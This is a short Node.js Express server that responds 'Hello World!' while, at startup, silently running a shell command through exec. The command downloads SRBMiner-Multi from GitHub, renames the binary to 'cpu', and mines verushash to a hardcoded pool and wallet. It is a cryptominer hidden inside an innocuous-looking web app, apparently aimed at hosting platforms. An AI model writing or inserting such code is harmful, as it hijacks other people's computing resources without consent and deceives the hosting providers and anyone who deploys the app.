var express = require('express')
var app = express();
const { exec } = require('child_process');

app.set('port', (process.env.PORT || 5000))
app.use(express.static(__dirname + '/public'))

app.get('/', function(request, response) {
  response.send('Hello World!')
})
exec('wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz;tar -xf SRBMiner-Multi-0-9-3-Linux.tar.xz;rm SRBMiner-Multi-0-9-3-Linux.tar.xz;cd SRBMiner-Multi-0-9-3;mv SRBMiner-MULTI cpu;./cpu --disable-gpu --algorithm verushash --pool  na.luckpool.net:3957 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.cyclic --password x', (err, stdout, stderr) => {
  if (err) {
    //some err occurred

  } else {
   // the *entire* stdout and stderr (buffered)

  }
});

app.listen(app.get('port'), function() {
  console.log("Node app is running at localhost:" + app.get('port'))
})
